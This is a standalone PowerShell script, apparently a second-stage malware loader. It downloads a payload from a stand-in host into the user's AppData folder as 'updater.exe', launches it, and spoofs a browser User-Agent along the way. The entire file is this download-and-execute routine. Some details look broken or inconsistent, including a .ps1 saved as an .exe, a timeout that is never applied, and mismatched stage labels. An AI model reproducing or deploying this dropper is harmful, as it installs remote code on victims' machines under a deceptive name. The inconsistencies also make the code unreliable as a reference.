
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://adatum.com/stage1.ps1",
    [string]$WorkingPath = "$env:APPDATA\updater.exe",
    [int]$TimeoutSec = 43,
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $FetchResult = Get-Stage2Payload -SourceUrl $PayloadUrl -DestinationPath $WorkingPath -TimeoutSec $TimeoutSec -UserAgent $BrowserAgent
    if ($FetchResult) {
        Start-Process -FilePath $WorkingPath
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Write-Output "stage 22 initialized"
$StageMarker = "stage-31"
